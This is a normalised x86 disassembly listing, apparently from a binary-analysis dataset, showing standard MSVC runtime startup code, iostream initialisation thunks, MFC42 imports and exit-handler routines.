mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402250
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
mov eax [ esp + 0x4 ]
retn 0x4
sub_401130
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401150
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401150
push ??1Init@ios_base@std@@QAE@XZ
call sub_4022d8
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_401170
call ??0_Winit@std@@QAE@XZ
jmp sub_401190
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401190
push ??1_Winit@std@@QAE@XZ
call sub_4022d8
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
sub_4022ac
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4022d8
push [ esp + 0x4 ]
call sub_4022ac
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_402471
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402490
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4024a2
xor eax eax
retn
sub_4024a5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
